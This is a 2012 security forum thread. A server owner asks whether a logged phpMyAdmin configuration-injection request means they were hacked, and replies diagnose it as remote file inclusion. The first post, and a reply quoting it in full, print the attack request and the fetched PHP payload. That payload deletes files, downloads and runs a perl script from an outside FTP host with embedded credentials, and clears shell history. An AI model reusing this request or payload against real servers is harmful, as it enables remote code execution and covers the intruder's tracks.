---
title: "Am I being hacked? Malicious HTTP access log."
date: 2012-10-27
forum: Security
---

### Post by francium25 on 2012-10-27
Please help me! I realized that the following is logged in my http log file.
 
```
action=lay_navigation&eoltype=unix&token=a13369792c1a33ec1130500ca821c5a4&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA_Config%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A47%3A%22ftp%3A%2F%2Fhawk1156%3ATuNPKPK123%40hawkish.co.uk%2Fieh.ico%22%3B%7D%7D
```
 
When I decode it, it becomes
 
```
 
action=lay_navigation&eoltype=unix&token=a13369792c1a33ec1130500ca821c5a4&configuration=a:1:{i:0;O:10:"PMA_Config":1:{s:6:"source";s:47:"[ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico](ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico)";}}

```
 
I got worried about the suspicious ftp link, and I decided to download it.
 
```
wget [ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico](ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico)
```
 
The content of the file was like this:
 
```
 
<? system("cd /tmp;rm -rf *;wget [ftp://hawk1156:TuNPKPK123@hawkish.co.uk/2.txt;perl](ftp://hawk1156:TuNPKPK123@hawkish.co.uk/2.txt;perl) 2.txt;curl -O hawk1156://ftp:TuNPKPK123@hawkish.co.uk/2.txt;perl 2.txt;fetch hawk1156://ftp:TuNPKPK123@hawkish.co.uk/2.txt;perl 2.txt;rm -rf 2.txt;history -c;");exit?>

```
 
Of course, I did never execute it by myself, but I am not sure if my server has already been hacked at this point. What should I do? I don't know where to start.

---

### Post by samiux on 2012-10-27
> **francium25 said:**
> Please help me! I realized that the following is logged in my http log file.
 
```
action=lay_navigation&eoltype=unix&token=a13369792c1a33ec1130500ca821c5a4&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA_Config%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A47%3A%22ftp%3A%2F%2Fhawk1156%3ATuNPKPK123%40hawkish.co.uk%2Fieh.ico%22%3B%7D%7D
```
 
When I decode it, it becomes
 
```
 
action=lay_navigation&eoltype=unix&token=a13369792c1a33ec1130500ca821c5a4&configuration=a:1:{i:0;O:10:"PMA_Config":1:{s:6:"source";s:47:"[ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico](ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico)";}}

```
 
I got worried about the suspicious ftp link, and I decided to download it.
 
```
wget [ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico](ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico)
```
 
The content of the file was like this:
 
```
 
<? system("cd /tmp;rm -rf *;wget [ftp://hawk1156:TuNPKPK123@hawkish.co.uk/2.txt;perl](ftp://hawk1156:TuNPKPK123@hawkish.co.uk/2.txt;perl) 2.txt;curl -O hawk1156://ftp:TuNPKPK123@hawkish.co.uk/2.txt;perl 2.txt;fetch hawk1156://ftp:TuNPKPK123@hawkish.co.uk/2.txt;perl 2.txt;rm -rf 2.txt;history -c;");exit?>

```
 
Of course, I did never execute it by myself, but I am not sure if my server has already been hacked at this point. What should I do? I don't know where to start.

Yes, your web server has been attacked.  Do you install phpmyadmin package?  If yes, they enter by that point.  And your web server has been compromised.

Samiux

---

### Post by OpSecShellshock on 2012-10-27
At a glance it looks like a remote file inclusion. Whether or not it would have worked depends on whether or not the web application was vulnerable. These sorts of things are usually automated and thrown at any server they come across even if it's not vulnerable, so it's important to look at what happened after. Was there an HTTP response to the incoming request, and if so what was it? Did the server retrieve the file from the malicious site afterwards? Is there anything suspicious happening now (such as extra code inserted in your page)?

---

### Post by samiux on 2012-10-27
@francium25,

If you don't mind, I would like to know the version of the following softwares as I would like to know how the attacker enter to your system :

(1) Ubuntu
(2) phpMyAdmin
(3) Apache
(4) MySQL
(5) PHP

Thank you.

Samiux

---

